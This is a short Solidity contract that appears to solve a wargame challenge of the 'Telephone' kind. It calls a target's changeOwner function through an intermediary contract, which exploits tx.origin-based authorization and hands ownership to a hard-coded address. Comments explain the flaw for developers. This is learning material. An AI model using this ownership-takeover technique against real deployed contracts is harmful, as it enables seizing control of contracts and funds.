// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    //call changeOwner using this contract so msg.sender will be not equal with tx.origin
    //external so other functions can call it
    function changeOwner(address _owner) external;
}

contract TelephoneCall {
    function telephoneCall(address _contractAddress) public{
         ITelephone(_contractAddress).changeOwner(0x9EFD24E96C9020f7e72cC216095dDc8972cAF123);
         //take note of tx.origin and msg.sender when building your own dApps. funds/tokens might get stuck in the wrong places if implemented poorly
    }
}